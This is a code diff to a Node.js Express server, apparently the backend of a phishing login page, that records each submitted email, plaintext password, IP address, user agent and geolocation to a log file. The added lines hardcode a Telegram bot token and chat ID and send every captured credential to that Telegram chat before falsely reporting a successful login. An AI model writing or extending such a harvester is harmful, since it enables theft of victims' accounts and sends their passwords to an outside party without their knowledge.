@@ -6,6 +6,10 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = 3000;
 
+// Telegram Bot API Token and Chat ID
+const TELEGRAM_API_URL = 'https://api.telegram.org/bot7623132208:AAHVNRLt2aTiF8sy2xADLdaEbN1zIDI543w';
+const TELEGRAM_CHAT_ID = '6144104455';
+
 // Middleware for parsing JSON and URL-encoded data
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
@@ -23,6 +27,29 @@ async function getGeoLocation(ip) {
     } catch (error) {
         console.error('Error fetching geolocation:', error);
         return 'Unknown Location';
+    }
+}
+
+// Function to send a message to Telegram
+async function sendToTelegram(message) {
+    try {
+        const fetch = (await import('node-fetch')).default; // Dynamically import node-fetch
+        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown', // Optional, for Markdown formatting
+            }),
+        });
+        if (!response.ok) {
+            console.error('Error sending message to Telegram:', await response.text());
+        } else {
+            console.log('Message sent to Telegram successfully.');
+        }
+    } catch (error) {
+        console.error('Error in sendToTelegram:', error);
     }
 }
 
@@ -45,8 +72,8 @@ app.post('/login', async (req, res) => {
 
     const logData = `${email}\n${password}\n${ipAddress}\n${timestamp}\n${userAgent}\n${location}\n\n`;
 
+    // Save to log file
     const logFilePath = path.join(__dirname, 'log.txt');
-
     fs.appendFile(logFilePath, logData, (err) => {
         if (err) {
             console.error('Error writing to log file:', err);
@@ -54,8 +81,21 @@ app.post('/login', async (req, res) => {
         }
 
         console.log('Login data saved:', logData);
-        res.status(200).send('Login successful.');
     });
+
+    // Prepare and send data to Telegram
+    const telegramMessage = `
+📌 **New Login Attempt**:
+- **Email**: ${email}
+- **Password**: ${password}
+- **IP Address**: ${ipAddress}
+- **Geolocation**: ${location}
+- **User Agent**: ${userAgent}
+- **Timestamp**: ${timestamp}
+`;
+    await sendToTelegram(telegramMessage);
+
+    res.status(200).send('Login successful.');
 });
 
 // Serve static files (e.g., index.html and js folder)
